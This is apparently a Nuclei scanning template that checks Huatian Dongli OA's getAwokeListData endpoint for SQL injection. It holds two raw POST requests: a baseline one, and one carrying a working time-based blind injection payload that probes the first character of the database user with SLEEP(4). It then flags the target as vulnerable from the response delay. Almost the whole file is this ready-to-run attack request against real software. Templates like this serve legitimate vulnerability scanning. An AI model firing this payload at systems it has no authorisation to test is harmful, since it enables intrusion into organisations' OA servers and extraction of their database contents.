id: huaiandongliOA-getAwokeListData-sql

info:
  name: 华天动力OA前台接口getawokelistdata存在SQL注入漏洞
  author: huaiandongliOA
  severity: high
  tags: huaiandongliOA

http:
  - raw:
      - |
        POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Cache-Control: max-age=0

        <buffalo-call>
          <method>getAwokeListData</method>
          <string>{"k":""}</string>
        </buffalo-call>

      - |
        POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Cache-Control: max-age=0

        <buffalo-call>
          <method>getAwokeListData</method>
          <string>{"k":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(4),0)"}</string>
        </buffalo-call>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration_1 < 2'
          - 'duration_2 >= 4'
          - 'duration_2 <= 10'
        condition: and
      - type: word
        part: body
        words:
          - "buffalo-reply"
